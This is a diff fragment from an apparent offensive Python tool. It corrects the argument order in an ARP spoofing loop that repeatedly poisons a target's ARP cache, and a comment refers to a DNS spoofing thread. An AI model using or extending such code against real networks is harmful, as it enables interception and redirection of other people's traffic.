@@ -104,7 +104,7 @@ def handle_command(cmd):
         def arp_spoof_loop(ip, mac, iptospoof):
             print("[*] Spoofing %s (MAC: %s ) as %s ... Press Ctrl+C to stop." % (ip, mac, iptospoof))
             while True:
-                arp_spoof(ip, iptospoof, mac)
+                arp_spoof(ip, mac, iptospoof)
                 time.sleep(2)
 
         # Start a new thread for DNS spoofing in order 
